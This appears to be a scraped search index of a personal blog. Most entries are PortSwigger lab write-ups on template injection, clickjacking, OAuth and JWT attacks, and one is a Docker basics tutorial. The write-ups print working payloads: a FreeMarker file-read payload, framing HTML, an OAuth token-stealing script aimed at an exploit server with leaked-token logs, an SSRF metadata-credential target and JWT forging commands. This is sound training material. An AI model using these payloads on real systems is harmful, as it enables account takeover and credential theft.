&amp;lt;no principals&amp;gt; java.security.Permissions@5fa07e12 ( (&quot;java.lang.RuntimePermission&quot; &quot;exitVM&quot;) (&quot;java.io.FilePermission&quot; &quot;/opt/jars/freemarker.jar&quot; &quot;read&quot;) )# Getting methods does not work, but with getClass we can use the documentation${product.getClass().getMethods()} ==&amp;gt; ERROR as it returns an array.# I was not able to get a list of methods in this way, but documentation https://docs.oracle.com/javase/8/docs/api/java/lang/Class.htmlhttps://docs.oracle.com/javase/8/docs/api/java/security/ProtectionDomain.htmlhttps://docs.oracle.com/javase/8/docs/api/java/security/CodeSource.htmletc.Working payload:${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)}This will return a byte array of the file we’re trying to read.Server-side template injection with a custom exploit This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:petertbd" }, { "title": "(Portswigger/WebAcademy) - Clickjacking vulnerabilities", "url": "/posts/clickjacking/", "categories": "Web Application, Clickjacking vulnerabilities", "tags": "Notes, Clickjacking vulnerabilities, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the Clickjacking Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC Basic clickjacking with CSRF token protection Clickjacking with form input data prefilled from a URL parameter Clickjacking with a frame buster script Exploiting clickjacking vulnerability to trigger DOM-based XSS Multistep clickjackingBasic clickjacking with CSRF token protection This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word “click” on a decoy website. To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.You can log in to your own account using the following credentials: wiener:peterFirst we have to login. TL:DR; The target website does not have any clickjacking protection.This is the payload page that victim will open:&amp;lt;head&amp;gt; &amp;lt;style&amp;gt; #target_website { position:relative; width:700px; height:600px; opacity:0.00001; z-index:2; } #decoy_website { position:absolute; top:492px; left:70px; z-index:1; } &amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;div id=&quot;decoy_website&quot;&amp;gt; Click Me &amp;lt;/div&amp;gt; &amp;lt;iframe id=&quot;target_website&quot; src=&quot;https://0a3c00b7033112208526365100e5001e.web-security-academy.net/my-account&quot;&amp;gt; &amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;For the screenshot i have changed the z-index of the decoy so it get’s visible and as seen below, it should be placed above the button Delete Account:This is the page that victim would see:Clickjacking with form input data prefilled from a URL parameter This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an “Update email” button. To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a “Click me” decoy. The lab is solved when the email address is changed. You can log in to your own account using the following credentials: wiener:peterThis lab is same as the last one, we just have to find a way to prepopulate a field in a form which will trigger a POST request with value that we (as attacker) have set.As seen below, we can use email in a GET request to achieve that.This is the code that worked for me:&amp;lt;style&amp;gt; iframe { position:relative; width:780px; height: 600px; opacity: 0.00001%; z-index: 2; } div { position:absolute; top:454px; left:70px; z-index: 1; }&amp;lt;/style&amp;gt;&amp;lt;div&amp;gt;Click Me&amp;lt;/div&amp;gt;&amp;lt;iframe src=&quot;https://0aaa008d03d1128b85934f6f00950027.web-security-academy.net/my-account?email=test@attacker.de&quot;&amp;gt;&amp;lt;/iframe&amp;gt;Clickjacking with a frame buster script This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address? To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on “Click me”. The lab is solved when the email address is changed. You can log in to your own account using the following credentials: wiener:peterSame lab as before, we just need to bypass frame buster by sandboxing the iframe.&amp;lt;style&amp;gt; iframe { position:relative; width:780px; height: 600px; opacity: 0.00001; z-index: 2; } div { position:absolute; top:449px; left:70px; z-index: 1; }&amp;lt;/style&amp;gt;&amp;lt;div&amp;gt;Click Me&amp;lt;/div&amp;gt;&amp;lt;iframe sandbox=&quot;allow-forms&quot;src=&quot;https://0a4e001804ae73c880ca031700cf00e7.web-security-academy.net/my-account?email=wiener@changed.de&quot;&amp;gt;&amp;lt;/iframe&amp;gt;Exploiting clickjacking vulnerability to trigger DOM-based XSS This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the “Click me” button to call the print() function.First we need to find a DOM XSS. I have used DOM Invader for that purpose:Page has no clickjacking protection so we can prefill the values by using them in a GET request as seen below:https://0a48002204bfa14b8080443700f100bc.web-security-academy.net/feedback?message=test&amp;amp;name=%3Cimg%20src%20onerror=print()%3E&amp;amp;email=a@a.de&amp;amp;subject=testWhen submitting, print() should fire.Multistep clickjacking This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on “Click me first” and “Click me next” decoy actions You will need to use two elements for this lab. You can log in to the account yourself using the following credentials: wiener:peterThis lab is protected by additional page when wanting to delete the account.After logging in:After clicking on Delete account:Because of the SOP, there we are limited what to do. Basically we display both CLick me buttons at once and the right places, so first click and second click align with buttons in an iframe that lead to account deletion.&amp;lt;style&amp;gt; iframe { position:relative; width:780px; height: 600px; opacity: 0.00001; z-index: 2; } #div1, #div2 { position:absolute; top:492px; left:70px; z-index: 1; } #div2 { top: 292px; left: 207px;} &amp;lt;/style&amp;gt;&amp;lt;div id=&quot;div1&quot;&amp;gt;Click me first&amp;lt;/div&amp;gt;&amp;lt;div id=&quot;div2&quot;&amp;gt;Click me next&amp;lt;/div&amp;gt;&amp;lt;iframe id =&quot;iframe&quot; src=&quot;https://0a1e001a038a370a805fc16900b7002e.web-security-academy.net/my-account&quot;&amp;gt;&amp;lt;/iframe&amp;gt;" }, { "title": "Simple Docker Tutorial", "url": "/posts/simple-docker-tutorial/", "categories": "Blogging", "tags": "Docker", "date": "2023-01-15 08:00:00 +0100", "snippet": "1. IntroThe reason for this post is simple. I use docker here and then and tend to forget some commands and then i might not be sure if i’ll want to store the data (read: create a volume with it) or not, hence writing this post.It about the basics how to get a docker container running, about containrs and volumes to get me/you started.2. Docker Basic TerminologyBefore diving into Docker commands, it’s important to understand the terminology used in Docker.Here are some key terms: Image: A pre-built package that contains all the dependencies and configurations needed to run an application. Container: An instance of an image that runs in isolation from the host system and other containers. Dockerfile: A text file that contains instructions to build an image. Registry: A storage location for Docker images, such as Docker Hub.3. Install DockerThings might change in the future, so check here on how to install docker on your platform.4. Pull an imageTo get started with Docker, you’ll need to pull an image from a registry. For example, to pull the official Ubuntu image, you can use the following command:docker pull ubuntuFor ARM architecture we’d use one of the following commands (we can use other image apart from ubuntu or version 20.04).docker pull arm64v8/ubuntudocker pull arm64v8/ubuntu:20.04We can list images using following command:docker image ls5. Run a containerOnce you have an image, you can use it to run a container. For example, to run a container from the Ubuntu image, use the following command (add --name handle if you want to add a name):docker run -it ubuntu bashThis will start a container and open a bash shell inside it. The -it flag tells Docker to run the container in interactive mode, and the bash command starts a bash shell. If you want to persist data you might want to add volume but more on that below in “Start a container and mount the volume”We can check running conainers using following commanddocker container lsPerhaps you want to see exited containers as well and if so add -a handle to the command above.If we want to exit interactive shell and want to preserve the dockers session we can use Ctrl+P followed by Ctrl+Q.If we want to enter the same container we need to use its name, in my case the container ran as frosty_noyce…docker exec -it frosty_noyce bashDocker can be STOPed using following commanddocker container stop &amp;lt;id&amp;gt;… or STARTeddocker container stop &amp;lt;id&amp;gt;Remove container:docker container rm &amp;lt;id&amp;gt;5.1 Modify a container:In the container itself, you can modify a container by installing packages or editing files inside it.For example, to install the nginx package in the container, use the following command:apt-get updateapt-get install nginx6. Volumes - Saving ChangesThere are few possibilities how to persist data from a newly created container.6.1 Create an ImageOnce you have made changes to a container, you can create a new image from it using the docker commit command. For example, to create a new image from the modified Ubuntu container, use the following command:docker commit &amp;lt;container-id&amp;gt; my-ubuntu-imageReplace &amp;lt;container-id&amp;gt; with the ID of the container you want to create an image from, and my-ubuntu-image with a name for the new image.6.2 Create a Volume and save data to itDocker volumes provide a way to store data outside of a container’s filesystem and make it available to multiple containers. This allows you to separate data and application code, and makes it easier to manage and backup your data.Here’s an example of how to use Docker volumes:6.2.1 Create a volume:docker volume create mydataThis will create a new volume named mydata.6.2.2 Start a container and mount the volumedocker run -it -v mydata:/app/data ubuntu bashThis will start a container from the ubuntu image, and mount the mydata volume at the /app/data directory inside the container.Make some changes inside the container, like creating new files or modifying existing ones, and save them to the mounted volume.6.2.3 Stop and remove the container:docker stop &amp;lt;container-id&amp;gt;docker rm &amp;lt;container-id&amp;gt;Replace with the ID of the container you want to remove.6.2.4 Start a new container and mount the same volume:docker run -it -v mydata:/app/data ubuntu bashThis will start a new container from the ubuntu image, and mount the mydata volume at the /app/data directory inside the container. The changes you made in the previous container should now be available in this new container.Note that Docker volumes can also be used to mount data from the host system or from other containers. For more information, see the Docker documentation on volumes: https://docs.docker.com/storage/volumes/6.3 Dockerfile6.3.1 Create a new directoryCreate a new directory for your project, and create a file named Dockerfile inside it.6.3.2 Specify the base imageIn the Dockerfile, specify the base image you want to use for your new imageFor example, if you want to use Ubuntu as the base image, you can add the following line to the Dockerfile:FROM ubuntu:latest6.3.3 Add any additional commandsAdd any additional commands you want to run in the container to the Dockerfile. For example, if you want to install the nginx web server, you can add the following line to the Dockerfile:RUN apt-get update &amp;amp;&amp;amp; apt-get install -y nginxYou can also specify environment variables, work directory, or add files to the container by adding ENV, WORKDIR, and COPY commands respectively.6.3.4 Save the DockerfileSave the Dockerfile and navigate to the directory in your terminal.6.3.5 Build the Docker image using the following commandBuild the Docker imagedocker build -t my-image-name .The -t option specifies a name for the image, and the . at the end specifies the location of the Dockerfile.6.3.6 Start a new containerAfter building, you can start a new container from your custom image:docker run -it my-image-name bashThis will start a new container from the my-image-name image and run the bash command inside it.Note: It’s important to keep your Dockerfile as simple and clean as possible, and to use best practices for building images. The Docker documentation provides many useful tips and best practices for Dockerfile creation: https://docs.docker.com/develop/develop-images/dockerfile_best-practices/7. OutroIt’s impossible to cover all scenarios without writing very lenghty article, but hopefully the few commands helped you with your docker endeavours and if not, just google or try asking OpenGPT" }, { "title": "(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities", "url": "/posts/oauth/", "categories": "Web Application, OAuth 2.0 authentication vulnerabilities", "tags": "Notes, OAuth 2.0 authentication vulnerabilities, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the JWT Token Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s or this ones about grant typesThere are two grant types which are: Authorization code grant type, which consists of Authorization Request (Client App =&amp;gt; Browser =&amp;gt; OAuth Service API) User login and consent which is sent from OAuth Service API to browser. This may be single click if Session with OAuth Provider is still valid, however consent will always be present. Authorization code grant will be sent from OAuth Service API to the Client App, and browser will be redirected to /callback SERVER2SERVER communcation continues between Client App and OAuth Service API. Authorization code will be exchanged for Access Token (POST Request to /token endpoint) Access token is (or not) granted from OAuth Service to Client App Client API fetches the user data that user has consented to. User is logged in. Implicit grant type Is the same thing, just there is no SERVER2SERVER communication and this grant type is much less secure. Make sure to check the grant types article at Portswigger’s.TOCAuthentication bypass via OAuth implicit flow This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users’ accounts without knowing their password. To solve the lab, log in to Carlos’s account. His email address is carlos@carlos-montoya.net. You can log in with your own social media account using the following credentials: wiener:peter.First let’s login using provided credentials wiener:peterNow several requests should’ve been sent:What happens if we change Email in /authenticate using Burp Repeater.We’ll get redirected and lab would’ve been solved. Just like that, we’ve bypassed authentication for carlos@carlos-montoya.net.Lab has been solvedForced OAuth profile linking This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users’ accounts. To solve the lab, use a CSRF attack to attach your own social media profile to the admin user’s account on the blog website, then access the admin panel and delete Carlos. The admin user will open anything you send from the exploit server and they always have an active session on the blog website. You can log in to your own accounts using the following credentials: Blog website account: wiener:peter Social media profile: peter.wiener:hotdog If we login using wiener:peter and we’ll see that we have Attach a social profile option.If we choose that and enter peter.wiener:hotdog credentials we’ll get to request from the OAuth Server to confirm the scope.If we confirm the scope, we’ll see the message that account has been linked with social media account.If we now log out …And go into My Account &amp;gt; Log in using Social Media Account we’ll get logged in instantly.Exploit. PS, there is no CSRF tokens! Delivery via button Deliver exploit to victim where victim will open everything.&amp;lt;img src=&quot;https://0a3300cf04a076a5c311b02e001f0080.web-security-academy.net/oauth-linking?code=CPbBtSiz6i_IziPL9VOJuw-OaQPYYz4FWeU3CwYPW4e&quot;&amp;gt;&amp;lt;/img&amp;gt;When victim opens the link above, its social account gets linked with wiener.All we have to do is login using social media account and we should see Admin Panel where we can delete carlos and complete the lab.As already mentioned in the lab description itself. The reason why, we were admin account got mapped with our user was lack of using state parameter in the auth request.OAuth account hijacking via redirect_uri This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users’ accounts. To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in with your own social media account using the following credentials: wiener:peter.When we click on My Account, we’ll automatically get redirected to Sign inLet’s signin using provided credentials wiener:peter. Confirm the scope and we should be logged in afterwards.If i log out and change the redirect_uri with the one with exploit-... then the WebApp will redirect me there and i’ll leak the tokenCheck the Access Logs87.181.171.142 2023-03-10 18:05:22 +0000 &quot;GET /oauth-callback?code=lH6JjG4-zM9WU7H71rnTcoO21Y_jDGE-PYHIwHEDDB2 HTTP/1.1&quot; 404 &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;Deliver the payload to victim&amp;lt;iframe src=&quot;https://oauth-0a370096040dd78fc2a9109f024800c8.oauth-server.net/auth?client_id=t01m58r8e75mz8c5brko5&amp;amp;redirect_uri=https://exploit-0a0600a904e5d707c20911290126001b.exploit-server.net&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&quot;&amp;gt;&amp;lt;/iframe&amp;gt;If we now go and check access logs, we should find few entries including the code that got leaked.10.0.4.215 2023-03-10 18:47:20 +0000 &quot;GET /exploit/ HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;10.0.4.215 2023-03-10 18:47:21 +0000 &quot;GET /?code=fgMsBD1PAaJJ30MKNZddEr6fKYTt2Sombr-haM1Ocss HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;10.0.4.215 2023-03-10 18:47:21 +0000 &quot;GET /resources/css/labsDark.css HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;Now log out, log in and intercept at oauth-callback and exchange the access token.Admin panel should now be seen. We can delete carlos and finish the lab.More secure authorization servers will require a redirect_uri parameter to be sent when exchanging the authorization code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second redirect_uri parameter. You can read more about that in at portswigger’s.Stealing OAuth access tokens via an open redirect This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user’s account. Use the access token to obtain the admin’s API key and submit the solution using the button provided in the lab banner. Note !!! You cannot access the admin’s API key by simply logging in to their account on the client application The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in via your own social media account using the following credentials: wiener:peterIn order to find a open redirect we obviously first need to search for it. When going into blog posts and click on Next Post, following request will fire/post/next?path=/post?postId=2If we exchange the /path, we’ll get redirected there.https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/auth?client_id=uyi3jd4v3nvvxrtr6ta3r&amp;amp;redirect_uri=https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/post/next?path=https://exploit-0a2b007004ba20c6c013da57015e0004.exploit-server.net/&amp;amp;response_type=token&amp;amp;nonce=-1323844043&amp;amp;scope=openid%20profile%20emailWhat’s now a bit tricky is to server a payload which will respond accordingly. We now need to create an exploit that first forces the victim to visit oue malicious URL and then executes the script we just tested to steal their access token.&amp;lt;script&amp;gt; if (!document.location.hash) { window.location = &quot;https://oauth-0aa10074040f209dc07dd97c029700e0.oauth-server.net/auth?client_id=uyi3jd4v3nvvxrtr6ta3r&amp;amp;redirect_uri=https://0a040096041a20bac0f1db9d003e00c5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a2b007004ba20c6c013da57015e0004.exploit-server.net/exploit&amp;amp;response_type=token&amp;amp;nonce=-1343228737&amp;amp;scope=openid%20profile%20email&quot; } else { window.location = &#39;/?&#39;+document.location.hash.substr(1) }&amp;lt;/script&amp;gt;Access log should be found:10.0.4.32 2023-03-10 20:02:04 +0000 &quot;GET /exploit HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;10.0.4.32 2023-03-10 20:02:04 +0000 &quot;GET /?access_token=CnvFuSgC49GVghnWkWEOIHoUbTLnz7qGuuDBDsfaAf_&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;10.0.4.32 2023-03-10 20:02:04 +0000 &quot;GET /resources/css/labsDark.css HTTP/1.1&quot; 200 &quot;user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&quot;We can request session tokenTo find the apikey, we’ll need to check the /me endpoint.This Lab is very similar to previous one, however we had to find a way to redirect access token using directory traversal vulnerability on open redirect.SSRF via OpenID dynamic client registration This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF. To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider’s cloud environment. You can log in to your own account using the following credentials: wiener:peter Note !!! To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.Login the provided credentials and check the openid configurationhttps://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/.well-known/openid-configuration{&quot;authorization_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/auth&quot;,&quot;claims_parameter_supported&quot;:false,&quot;claims_supported&quot;:[&quot;sub&quot;,&quot;name&quot;,&quot;email&quot;,&quot;email_verified&quot;,&quot;sid&quot;,&quot;auth_time&quot;,&quot;iss&quot;],&quot;code_challenge_methods_supported&quot;:[&quot;S256&quot;],&quot;end_session_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/session/end&quot;,&quot;grant_types_supported&quot;:[&quot;authorization_code&quot;,&quot;refresh_token&quot;],&quot;id_token_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;,&quot;PS256&quot;,&quot;RS256&quot;],&quot;issuer&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net&quot;,&quot;jwks_uri&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/jwks&quot;,&quot;registration_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/reg&quot;,&quot;response_modes_supported&quot;:[&quot;form_post&quot;,&quot;fragment&quot;,&quot;query&quot;],&quot;response_types_supported&quot;:[&quot;code&quot;],&quot;scopes_supported&quot;:[&quot;openid&quot;,&quot;offline_access&quot;,&quot;profile&quot;,&quot;email&quot;],&quot;subject_types_supported&quot;:[&quot;public&quot;],&quot;token_endpoint_auth_methods_supported&quot;:[&quot;none&quot;,&quot;client_secret_basic&quot;,&quot;client_secret_jwt&quot;,&quot;client_secret_post&quot;,&quot;private_key_jwt&quot;],&quot;token_endpoint_auth_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;RS256&quot;,&quot;PS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;],&quot;token_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token&quot;,&quot;request_object_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;RS256&quot;,&quot;PS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;],&quot;request_parameter_supported&quot;:false,&quot;request_uri_parameter_supported&quot;:true,&quot;require_request_uri_registration&quot;:true,&quot;userinfo_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/me&quot;,&quot;userinfo_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;,&quot;PS256&quot;,&quot;RS256&quot;],&quot;introspection_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token/introspection&quot;,&quot;introspection_endpoint_auth_methods_supported&quot;:[&quot;none&quot;,&quot;client_secret_basic&quot;,&quot;client_secret_jwt&quot;,&quot;client_secret_post&quot;,&quot;private_key_jwt&quot;],&quot;introspection_endpoint_auth_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;RS256&quot;,&quot;PS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;],&quot;revocation_endpoint&quot;:&quot;https://oauth-0a3400b503aa5e44c472180502db00f0.oauth-server.net/token/revocation&quot;,&quot;revocation_endpoint_auth_methods_supported&quot;:[&quot;none&quot;,&quot;client_secret_basic&quot;,&quot;client_secret_jwt&quot;,&quot;client_secret_post&quot;,&quot;private_key_jwt&quot;],&quot;revocation_endpoint_auth_signing_alg_values_supported&quot;:[&quot;HS256&quot;,&quot;RS256&quot;,&quot;PS256&quot;,&quot;ES256&quot;,&quot;EdDSA&quot;],&quot;claim_types_supported&quot;:[&quot;normal&quot;]}OpenID Client registration can be found at /reg endpoint.Client app has been succesfully created!During the Authorize phase we can specify client id and URLGET /auth?client_id=pzqqqsgjugy5wv6omxhmy&amp;amp;redirect_uri=https://0a790040031c5eb2c4cc1cb3006d0067.web-security-academy.net/oauth-callback&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email HTTP/2Stealing OAuth access tokens via a proxy page This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user’s account. Use the access token to obtain the admin’s API key and submit the solution using the button provided in the lab banner. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in via your own social media account using the following credentials: wiener:peter. Note !!! As the victim uses Chrome, we recommend also using Chrome (or Burp’s built-in Chromium browser) to test your exploit.… tbd" }, { "title": "(Portswigger/WebAcademy) - JWT Token Vulnerabilities", "url": "/posts/JWT_Token/", "categories": "Web Application, JWT Token Vulnerabilities", "tags": "Notes, JWT Token Attacks, Portswigger", "date": "2023-01-15 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the JWT Token Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC JWT authentication bypass via unverified signature JWT authentication bypass via flawed signature verification JWT authentication bypass via weak signing key JWT authentication bypass via jwk header injection JWT authentication bypass via jku header injection JWT authentication bypass via kid header path traversal JWT authentication bypass via algorithm confusion JWT authentication bypass via algorithm confusion with no exposed keyJWT authentication bypass via unverified signature This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn’t verify the signature of any JWTs that it receives. To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterWe can login using provided credentials wiener:peter.We should take a look at JWT token.I’ll be using JWT Editor Burp ExtensionWe can intercept and simply change wiener to administrator as signature isn’t being verifiedWe can reach the /admin panel where we can delete user carlos in order to solve the labAlternatively, we could simply change the user on https://jwt.io and copy-paste the token.JWT authentication bypass via flawed signature verification This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterSame as in the previous lab, spin the lab and login using provided credentials wiener:peter.Let’s check the JWT Token using JWT Editor in Burp.Let’s try none signing algorithmPaste the token in the browser and delete carlos in order to solve the lab.Alternatively we could use wiener’s token and run it througt jwt_tooljwt_tool eyJraWQiOiJhNjI5OTk2My1jYmIwLTQ0NmMtOTk0YS01MzNjZjk5MWNiMjAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3Mzg5ODY5NH0.dSMupWeq6dJxk9WOqDjW9Hv2wrOs2y29fhig24pwroH6vI8gmO6lU-Zniz3T8eCrvpGz8Bs36RK0PWKxTcsWfvI68LMbwuud9pmHwg5hpTGMXphZptTYTmh_T1Cu-J9gzRJVLvYkKobseJ_z5PISh5f0nTNuF5QIpV7nZ2s-bLD7OxrwNl3VTjDqUQOIS13l9Xn-jPs28IyQiskI8IbOe4EpRUDfc8179Xa-w5l4LV_QD3rQcDyybq6fvkow6kw_tE01G2Ck4qTAQxImXcM-nIICW-vwssqZQYVCZ6hLui-IKbMgnssQOayEhwC1Vqg2FEQr0WN8uQMEKdZrjvasJw -pc sub -pv administator -I -X a-pc and -pv will change payload value from wiener to administrator and -X a means attack - algo:noneJWT authentication bypass via weak signing key This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets. To solve the lab, first brute-force the website’s secret key. Once you’ve obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterThis one i’ll make it short as it’s relatively simple.We login using ´wiener:peter´. Run hashcat against the hashhashcat hash ../wordlists/jwt.secrets.list -m 16500Use either https://jwt.io or jwt_tool and sign the token back using found secret key.jwt_tool eyJraWQiOiIxZDlkNWZhMS0xMWRjLTQzZWMtYjZjZC1jOGYxM2YxOTk2ZTIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3Mzg5OTcxM30.hUWLKQ6Fyrc1iywdg2Iv8_DFmzal7cvR3OD1UbS5mRg -pc sub -pv administrator -I -p secret1 -S hs256Exchange the token new one and delete carlosJWT authentication bypass via jwk header injection This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterAs in previous lab, login using wiener:peter and intercept the request.Choose Embeded JWK in Attack, but bear in mind that you need to have generated RSA key before that. Change wiener to administrator.When using the new token, /admin should be reachable where we can delete carlos in order to solve the lab.JWT authentication bypass via jku header injection This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterWe will copy public key of our RSA certificate which will be used for signing.This is what our exploit server will serve. We have copied public key.We need to add jku header which points to our exploit server.Now we can delete user carlos in order to solve the lab.We can also verify that requests have been made towards our exploit server.JWT authentication bypass via kid header path traversal This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem. To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterAs in previous labs, login using wiener:peter and check the Token in JWT Editor:Admin interface is still only available to administratorFor this attack we’ll need Symmetric Key ready from JWT Editor.Exchange the k value with AA== (this is not necesarry for an attack, but it’s just workaround for Burp)Change the kid and sub payload/header values accordingly.Now exchange the token and delete carlos in order to finish the lab.JWT authentication bypass via algorithm confusion This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server’s public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos. You can log in to your own account using the following credentials: wiener:peterMake sure you check this article first so the lab actually makes sense ==&amp;gt; https://portswigger.net/web-security/jwt/algorithm-confusionWe can login using wiener:peter and we’d notice that JWT is hardened however there’s an endpoint exposing a JWK set containing single public key:Using that public key 